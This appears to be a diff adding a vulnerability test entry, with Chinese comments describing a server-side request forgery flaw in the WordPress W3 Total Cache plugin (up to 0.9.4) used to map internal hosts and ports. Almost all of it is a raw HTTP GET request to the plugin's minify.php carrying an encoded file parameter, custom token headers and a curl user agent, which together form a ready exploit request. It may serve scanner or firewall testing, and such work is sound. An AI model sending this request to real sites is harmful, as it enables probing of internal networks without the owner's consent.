@@ -1,0 +1,9 @@
+# Wordpress W3C Total Cache服务器请求伪造漏洞
+# Wordpress plugin W3C Total Cache <= 0.9.4 存在服务器端请求伪造漏洞，可用于识别内部主机和端口。
+GET /wp-content/plugins/w3-total-cache/pub/minify.php?acid=80001710&file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css&bid=hd_tag_m8mv25gg HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25gg
+RM-PRO-Token: 92b0092353619f64ce2c69c483767f3e
+RM-PRO-Time: 1742808466266
+User-Agent: curl/7.83.1
+
